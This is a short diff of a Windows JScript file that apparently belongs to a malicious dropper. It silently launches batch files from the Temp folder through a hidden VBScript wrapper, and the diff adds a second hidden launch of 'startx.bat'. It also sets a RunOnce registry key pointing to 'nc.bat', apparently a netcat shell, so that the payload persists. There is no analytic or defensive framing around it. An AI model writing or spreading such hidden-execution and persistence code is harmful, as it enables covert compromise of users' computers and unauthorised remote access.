@@ -16,6 +16,7 @@
 	    		
 
 var start = new ActiveXObject("WScript.Shell").Run('"%Temp%\\hidden.vbs "%Temp%\\nc.bat"',1,false);
+var startx = new ActiveXObject("WScript.Shell").Run('"%Temp%\\hidden.vbs "%Temp%\\startx.bat"',1,false);
 
 var reg_add = new ActiveXObject("WScript.Shell");
 reg_add.RegWrite("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\XSample", '"%Temp%\\nc.bat"', "REG_SZ");
